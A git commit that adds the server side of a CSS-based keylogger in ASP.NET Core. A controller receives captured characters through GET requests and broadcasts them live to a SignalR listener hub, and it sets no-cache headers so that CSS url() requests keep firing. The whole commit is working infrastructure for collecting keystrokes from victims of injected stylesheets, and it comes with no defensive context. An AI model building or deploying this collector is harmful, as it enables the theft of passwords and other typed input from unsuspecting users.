80ddded0246eb912050a0d1bd6f7cd79e9dd9473
Tanel Hiob <tanelhiob@outlook.com>
2018-02-21 22:50:02 +0200

    Implemented keylogger

---
+++ CssKeylogger.Web/Controllers/KeyloggerController.cs
@@ -0,0 +1,30 @@
+﻿using CssKeylogger.Web.Hubs;
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.AspNetCore.SignalR;
+
+namespace CssKeylogger.Web.Controllers
+{
+    [Route("api/[controller]")]
+    public class KeyloggerController : Controller
+    {
+        private readonly IHubContext<KeyloggerListenerHub> _keyloggerListenerHub;
+
+        public KeyloggerController(IHubContext<KeyloggerListenerHub> keyloggerListenerHub)
+        {
+            _keyloggerListenerHub = keyloggerListenerHub;
+        }
+
+        [HttpGet("{type}/{input}")]
+        public async void LogInput(string type, string input)
+        {
+            await _keyloggerListenerHub.Clients.All.InvokeAsync("InputReceived", type, input);
+
+            // Css has its own cache on the url() that isn't affected by headers here
+            Response.Headers["Pragma-directive"] = "no-cache";
+            Response.Headers["Cache-directive"] = "no-cache";
+            Response.Headers["Cache-control"] = "no-cache";
+            Response.Headers["Pragma"] = "no-cache";
+            Response.Headers["Expires"] = "0";
+        }
+    }
+}
---
+++ CssKeylogger.Web/Hubs/KeyloggerListenerHub.cs
@@ -0,0 +1,8 @@
+﻿using Microsoft.AspNetCore.SignalR;
+
+namespace CssKeylogger.Web.Hubs
+{
+    public class KeyloggerListenerHub : Hub
+    {
+    }
+}
